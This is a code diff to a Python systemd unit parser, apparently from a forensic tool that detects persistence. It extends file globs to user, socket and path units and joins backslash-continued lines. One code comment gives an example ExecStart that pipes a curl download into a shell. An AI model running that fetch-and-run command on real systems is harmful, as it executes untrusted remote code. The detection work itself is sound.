@@ -48,16 +48,19 @@ class SystemdParser(BaseParser):
 
     def run(self) -> None:
         units_by_name: dict[str, list[Path]] = {}
-        files = self.finder.find_by_glob([
-            "**/etc/systemd/system/**/*.service",
-            "**/etc/systemd/system/**/*.timer",
-            "**/run/systemd/system/**/*.service",
-            "**/run/systemd/system/**/*.timer",
-            "**/usr/lib/systemd/system/**/*.service",
-            "**/usr/lib/systemd/system/**/*.timer",
-            "**/lib/systemd/system/**/*.service",
-            "**/lib/systemd/system/**/*.timer",
-        ])
+        # Cover system AND user units, plus socket/path activation — all are
+        # ExecStart-bearing persistence vectors that the previous .service/
+        # .timer-only globs missed.
+        _unit_dirs = (
+            "etc/systemd/system", "run/systemd/system",
+            "usr/lib/systemd/system", "lib/systemd/system",
+            "etc/systemd/user", "usr/lib/systemd/user",
+        )
+        _unit_exts = ("service", "timer", "socket", "path")
+        globs = [f"**/{d}/**/*.{e}" for d in _unit_dirs for e in _unit_exts]
+        # per-user units under ~/.config/systemd/user/
+        globs += [f"**/.config/systemd/user/**/*.{e}" for e in _unit_exts]
+        files = self.finder.find_by_glob(globs)
         seen: set[Path] = set()
         files = [f for f in files if f.is_file() and not (f in seen or seen.add(f))]
 
@@ -102,10 +105,28 @@ class SystemdParser(BaseParser):
         except OSError:
             mtime = datetime.now(timezone.utc)
 
+        # Join systemd backslash line-continuations first: a directive value
+        # can span multiple physical lines (e.g.
+        #   ExecStart=/bin/sh -c 'foo \
+        #   curl http://x | sh')
+        # Without joining, the continued payload has no '=' and was dropped,
+        # so the malicious part of an ExecStart escaped detection.
+        logical: list[str] = []
+        buf = ""
+        for raw in read_lines(path):
+            buf += raw.rstrip("\n")
+            if buf.endswith("\\"):
+                buf = buf[:-1] + " "
+                continue
+            logical.append(buf)
+            buf = ""
+        if buf:
+            logical.append(buf)
+
         section = ""
         kv: dict[str, list[str]] = {}
-        for raw in read_lines(path):
-            line = raw.strip()
+        for line in logical:
+            line = line.strip()
             if not line or line.startswith("#") or line.startswith(";"):
                 continue
             if line.startswith("[") and line.endswith("]"):
